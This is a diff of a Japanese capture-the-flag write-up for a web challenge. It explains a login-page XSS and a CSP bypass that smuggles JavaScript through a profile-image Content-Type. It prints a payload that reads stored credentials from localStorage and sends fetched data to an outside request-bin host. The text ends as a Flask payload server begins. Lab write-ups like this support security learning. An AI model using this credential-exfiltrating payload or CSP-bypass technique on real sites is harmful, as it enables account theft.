@@ -22,7 +22,7 @@ Admin BotがあることからXSSが怪しい。
 確かに`https://tickler.web.actf.co/login?error=%3Cs%3ESatoki%3Cimg%20src=1%3E`とするとHTMLタグが有効になっている。  
 ![error.png](images/error.png)  
 imgタグのonerrorでXSSできるかと思うが、CSPが`script-src 'self'`のようにかかっている。  
-つまり、サイト内のどこかにjsをアップロードし、それを読み取る必要がある。  
+つまり、サイト内のどこかにJavaScriptファイルをアップロードし、それを読み取る必要がある。  
 プロフィール画像のfetch箇所が怪しい。  
 フラグの場所やCSP Bypass手法を調査するためにソースの主要箇所を見る。  
 初めに、フラグの場所と取得できる条件を確認すると以下のようであった。  
@@ -56,7 +56,7 @@ imgタグのonerrorでXSSできるかと思うが、CSPが`script-src 'self'`の
 ~~~
 ```
 フラグは`/getFlag`にあり、アクセスしたユーザの`tickles`が`Infinity`であると手に入る。  
-Admin Botが`/admin`にアクセスした場合のみ、ランダムなusernameとpasswordでユーザが作成され、`tickles`は`Infinity`となる。  
+Admin Botが`/admin`にアクセスした場合のみ、ランダムなusernameとpasswordでユーザが作成され、そのユーザの`tickles`は`Infinity`となる。  
 何とか自身のアカウントの`tickles`を`Infinity`にできないだろうか。  
 ```ts
 ~~~
@@ -145,8 +145,8 @@ CSP Bypassのため、最も怪しいプロフィール画像のfetch箇所を�
         }),
 ~~~
 ```
-プロフィール画像として外部のURLをfetchし、サイズなどのチェックの後にbase64したデータとContent-Typeを保存している。  
-また、`/picture`でクエリで指定したユーザのプロフィール画像が返ってくるようだ。  
+プロフィール画像として外部のURLをfetchし、サイズなどのチェックの後にbase64エンコードしたデータとContent-Typeを保存している。  
+また、`/picture`でクエリで指定したユーザ名のプロフィール画像が返ってくるようだ。  
 ```ts
 ~~~
     } else if (route === '/picture') {
@@ -168,13 +168,14 @@ CSP Bypassのため、最も怪しいプロフィール画像のfetch箇所を�
 $ curl 'https://tickler.web.actf.co/picture?username=hack'
 data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABA~~~
 ```
-同じドメインからユーザからの入力が返ってくる機能であるため、CSP Bypassに用いることができそうだ。  
+同じドメイン上のレスポンスとしてユーザからの入力が返ってくる機能であるため、CSP Bypassに用いることができそうだ。  
 `data:`で始まり一見するとJavaScriptとして読み込めないと感じるが、Content-Typeを`alert(1);//`のようにすることで、`data:alert(1);//;base64,XXXXXXXXXX`のように有効なJavaScriptとすることができる。  
-実行するXSSペイロードはlocalStorageのクレデンシャルを持ったまま`/getFlag`をfetchし、それをリクエストを受信する[サーバ](https://pipedream.com/requestbin)へ送信するものとなる。  
+実行するXSSペイロードはlocalStorageのクレデンシャルを持ったまま`/getFlag`をfetchし、それを[リクエストを受信するサーバ](https://pipedream.com/requestbin)へ送信するものとなる。  
 ```js
 fetch("/api/getFlag", {headers: {login: localStorage.username + ":" + localStorage.password, "content-type": "application/json"}}).then(res => res.text()).then(text => fetch("https://enqhnbwm4vjef.x.pipedream.net/?s=" + encodeURIComponent(text))); //satoki
 ```
-以下のようなサーバを外部に立て、プロフィール画像としてfetchさせて設定すればよい。  
+以下のようなサーバをimg_server.pyとして外部に立て、プロフィール画像としてfetchさせることでXSSペイロードを設定すればよい。  
+内容はbase64エンコードされるので、Content-typeに設定している点に注意が必要である。  
 ```python
 from flask import Flask, Response
 
